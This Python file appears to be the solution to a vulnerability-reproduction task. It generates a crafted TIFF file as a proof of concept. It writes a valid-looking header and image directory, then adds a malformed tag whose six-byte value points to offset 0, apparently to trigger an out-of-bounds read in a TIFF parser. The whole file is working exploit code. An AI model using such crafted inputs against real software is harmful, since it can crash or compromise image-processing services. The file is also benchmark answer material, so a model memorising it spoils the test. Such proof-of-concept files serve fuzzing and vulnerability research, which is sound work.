import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def add_tag(tag_id, typ, count, val):
            tbytes = struct.pack('<HHI', tag_id, typ, count)
            widths = {1:1, 2:1, 3:2, 4:4, 5:8, 6:1, 7:1, 8:2, 9:4, 10:8, 11:4, 12:8}
            width = widths.get(typ, 1)
            needed = count * width
            if needed <= 4:
                vfield = struct.pack('<I', val)
            else:
                vfield = struct.pack('<I', val)
            return tbytes + vfield

        header = struct.pack('<HHI', 0x4949, 42, 12)
        pre_ifd = b'\x00\x00\x00\x00'
        num_tags = struct.pack('<H', 12)

        valid_tags = [
            (254, 4, 1, 0),      # NewSubfileType
            (255, 3, 1, 1),      # SubfileType
            (256, 4, 1, 64),     # ImageWidth
            (257, 4, 1, 64),     # ImageLength
            (258, 3, 1, 8),      # BitsPerSample
            (259, 3, 1, 1),      # Compression
            (262, 3, 1, 1),      # PhotometricInterpretation
            (273, 4, 1, 0),      # StripOffsets
            (277, 3, 1, 1),      # SamplesPerPixel
            (278, 4, 1, 64),     # RowsPerStrip
            (279, 4, 1, 4096),   # StripByteCounts
        ]

        tags_bytes = b''.join(add_tag(*t) for t in valid_tags)

        # Invalid tag
        invalid_tag_id = 0xC000
        invalid_typ = 3  # SHORT
        invalid_count = 3  # 6 bytes > 4
        invalid_offset = 0
        invalid_bytes = add_tag(invalid_tag_id, invalid_typ, invalid_count, invalid_offset)

        all_tags = tags_bytes + invalid_bytes
        next_ifd = struct.pack('<I', 0)

        ifd = num_tags + all_tags + next_ifd
        poc = header + pre_ifd + ifd
        return poc